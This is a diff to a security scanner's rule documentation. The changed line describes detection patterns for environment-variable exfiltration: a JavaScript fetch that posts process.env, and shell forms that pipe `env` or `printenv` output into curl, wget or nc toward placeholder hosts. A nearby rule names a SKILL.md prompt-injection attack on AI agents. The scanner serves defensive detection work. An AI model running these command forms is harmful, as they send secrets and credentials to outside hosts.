@@ -211,7 +211,7 @@ Full rule catalog in Semgrep-portable YAML. Category summary:
     regex: "^(post|put|patch|get|request)$"
   severity: ERROR   # → Critical
 ```
-Plus a JS pattern for `fetch(url, { body: JSON.stringify(process.env) })` and shell regexes for an environment dump (`env`, `printenv`, `export -p`, `set`) sent as curl or wget data (`curl -d "$(env)"`, `--data @<(env)`) or piped into a network client that reads stdin (`env | curl -d @- URL`, `env | nc HOST PORT`). See `specs/RULES.md` for the exact forms.
+Plus a JS pattern for `fetch(url, { body: JSON.stringify(process.env) })` and shell regexes for an environment dump (such as `env`, `printenv`, `export -p`, or `set`) sent as curl or wget data (`curl -d "$(env)"`, `--data @<(env)`) or sent to the stdin of a network client (`env | curl -d @- URL`, `env | nc HOST PORT`, `curl --data-binary @- URL <<< "$(env)"`). See `specs/RULES.md` for the exact forms.
 
 **`PI-EXFIL-TRIGGER-CLAUSE` — Critical.** The Repello-signature SKILL.md attack.
 ```regex
